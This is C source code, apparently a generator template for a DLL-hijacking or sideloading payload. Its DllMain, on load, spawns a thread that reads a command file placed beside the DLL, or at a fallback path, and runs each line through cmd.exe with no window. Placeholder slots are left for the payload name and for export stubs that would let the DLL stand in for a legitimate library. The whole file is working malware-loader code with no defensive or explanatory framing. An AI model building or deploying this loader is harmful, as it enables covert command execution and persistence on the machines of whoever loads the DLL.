#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#ifdef __TINYC__
#include "tcc_compat.h"
#endif
#include <stdint.h>
#include <stdio.h>
#include <wchar.h>

static const wchar_t PAYLOAD_NAME[] = L"__PAYLOAD_NAME__";
static const wchar_t PAYLOAD_FALLBACK[] = L"__PAYLOAD_FALLBACK__";
static wchar_t g_dir[MAX_PATH];

static FILE *open_payload(void)
{
    wchar_t path[MAX_PATH];
    FILE *f;

    _snwprintf(path, MAX_PATH, L"%s\\%s", g_dir, PAYLOAD_NAME);
    f = _wfopen(path, L"rb");
    if (f) {
        return f;
    }
    return _wfopen(PAYLOAD_FALLBACK, L"rb");
}

static void run_one_line(char *line)
{
    wchar_t wcmd[4096];
    wchar_t cmdline[4200];
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    size_t n;

    while (*line == ' ' || *line == '\t') {
        line++;
    }
    n = 0;
    while (line[n]) {
        n++;
    }
    while (n && (line[n - 1] == '\n' || line[n - 1] == '\r' || line[n - 1] == ' ')) {
        line[--n] = 0;
    }
    if (!n) {
        return;
    }
    if (!MultiByteToWideChar(CP_UTF8, 0, line, -1, wcmd, 4096)) {
        return;
    }
    _snwprintf(cmdline, 4200, L"cmd.exe /c %s", wcmd);
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (CreateProcessW(NULL, cmdline, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
    }
}

static DWORD WINAPI payload_thread(LPVOID unused)
{
    FILE *f;
    char buf[4096];

    (void)unused;
    f = open_payload();
    if (!f) {
        return 0;
    }
    while (fgets(buf, sizeof(buf), f)) {
        run_one_line(buf);
    }
    fclose(f);
    return 0;
}

static void run_payload(void)
{
    HANDLE t = CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
    if (t) {
        CloseHandle(t);
    }
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        wchar_t buf[MAX_PATH];
        if (GetModuleFileNameW(hinst, buf, MAX_PATH)) {
            wchar_t *slash = wcsrchr(buf, L'\\');
            if (slash) {
                *slash = 0;
                wcsncpy(g_dir, buf, MAX_PATH);
                g_dir[MAX_PATH - 1] = 0;
            }
        }
        run_payload();
    }
    return TRUE;
}

__STUBS__
